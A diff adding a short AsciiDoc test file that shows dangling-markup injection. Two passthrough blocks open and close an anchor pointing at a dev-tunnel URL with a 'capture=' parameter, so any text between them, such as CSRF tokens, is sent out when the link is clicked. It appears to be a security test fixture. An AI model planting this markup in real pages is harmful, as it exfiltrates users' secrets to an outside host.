@@ -1,0 +1,13 @@
+= Split Dangling Test
+
+Block 1 opens the tag:
+++++
+<a href="https://global.rel.tunnels.api.visualstudio.com/split?capture=
+++++
+
+This normal text between blocks might be captured inside the href attribute. If CSRF tokens were here they would be exfiltrated when the link is clicked.
+
+Block 2 closes it:
+++++
+">CLICK HERE</a>
+++++
